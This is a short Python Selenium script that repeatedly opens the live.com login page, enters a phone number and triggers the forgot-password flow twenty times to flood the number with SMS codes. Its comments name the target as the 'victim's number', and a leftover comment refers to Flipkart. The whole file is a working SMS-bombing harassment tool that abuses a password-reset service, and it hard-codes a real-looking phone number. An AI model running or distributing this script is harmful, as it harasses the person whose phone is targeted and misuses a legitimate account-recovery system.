from selenium import webdriver
from selenium.webdriver.common.by import By

# from selenium.webdriver.common.keys import Keys
import time
for i in range(20):
	# create instance of Chrome webdriver
	driver=webdriver.Chrome()
	driver.get("https://login.live.com/")

	# find the element where we have to
	# enter the xpath
	# target mobile number, change it to victim's number and
	# also ensure that it's registered on flipkart
	driver.find_element(By.XPATH, '/html/body/div/form[1]/div/div/div[2]/div[1]/div/div/div/div/div[1]/div[3]/div/div/div/div[2]/div[2]/div/input[1]').send_keys("6238578533")
	# driver.find_element_by_xpath('//*[@id="i0116"]').send_keys('6238578533')
	# find the element continue
	# request using xpath
	# clicking on that element

	driver.find_element(By.XPATH, '/html/body/div/form[1]/div/div/div[2]/div[1]/div/div/div/div/div[1]/div[3]/div/div/div/div[4]/div/div/div/div/input').click()
	# find the element to send a forgot password
	# request using xpath

	driver.find_element(By.XPATH, '/html/body/div/form[1]/div/div/div[2]/div[1]/div/div/div/div/div/div[3]/div/div[2]/div/div[4]/div[1]/div/div/div/div[1]/a').click()
	driver.find_element(By.XPATH, '/html/body/div[1]/div/div/div[2]/div/div[1]/div[2]/div/div[1]/div/div/form/div/div[9]/div/div/div/div[2]/input').click()

	# set the interval to send each sms
	time.sleep(1)

	# Close the browser
	driver.close()

